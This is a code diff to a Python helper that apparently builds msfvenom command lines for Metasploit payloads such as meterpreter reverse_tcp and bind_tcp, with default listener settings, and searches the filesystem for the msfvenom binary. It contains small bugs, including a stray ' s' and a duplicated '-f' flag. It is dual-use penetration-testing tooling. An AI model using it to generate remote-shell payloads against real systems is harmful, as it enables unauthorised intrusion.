@@ -1,3 +1,5 @@
+import os
+
 PAYLOADS = ["",
             "linux/x86/meterpreter/reverse_tcp",
             "linux/x86/meterpreter/bind_tcp",
@@ -85,8 +87,59 @@ LORUM = "Lorem ipsum dolor sit amet"
 
 class CommandBuilder:
     def __init__(self):
-        self.msfvenom_path = ""
-        self.payloads = ["one", "two", "three"]
+        self.msfvenom_path = "msfvenom"
+        self.payload = "linux/x86/meterpreter/reverse_tcp"
+        self.exe_format = ""
+        self.transform_format = ""
+        self.encoding = ""
+        self.lhost = "127.0.0.1"
+        self.lport = "4444"
+        self.rhost = ""
+        self.rport = ""
+        self.out_file = "/tmp/payload"
+        self.additional_args = ""
+        self.build_command = ""
+        self.console_out = ""
 
-    def get_payloads(self):
-        return self.payloads
+    def create_build_command(self):
+        self.build_command = f"{self.msfvenom_path} -p {self.payload} "
+
+        if self.exe_format != "":
+            self.build_command += f"-f {self.exe_format} "
+
+        if self.transform_format != "":
+            self.build_command += f"-f {self.transform_format} "
+
+        if self.encoding != "":
+            self.build_command += f"-e {self.encoding} "
+
+        if self.lhost != "":
+            self.build_command += f"LHOST={self.lhost} "
+
+        if self.lport != "":
+            self.build_command += f"LPORT={self.lport} "
+
+        if self.rhost != "":
+            self.build_command += f"RHOST={self.rhost} "
+
+        if self.rport != "":
+            self.build_command += f"RPORT={self.rport} "
+
+        if self.additional_args != "":
+            self.build_command += f"{self.additional_args} s"
+
+        if self.out_file != "":
+            self.build_command += f"-o {self.out_file} "
+
+        self.build_command += "\n"
+
+        return self.build_command
+
+    def find_msfvenom(self):
+        print("looking for msfvenom")
+        for root, dirs, files in os.walk("/"):
+            if "msfvenom" in files:
+                self.msfvenom_path = os.path.join(root, "msfvenom")
+                print(self.msfvenom_path)
+                return
+        self.msfvenom_path = "unable to find msfvenom"
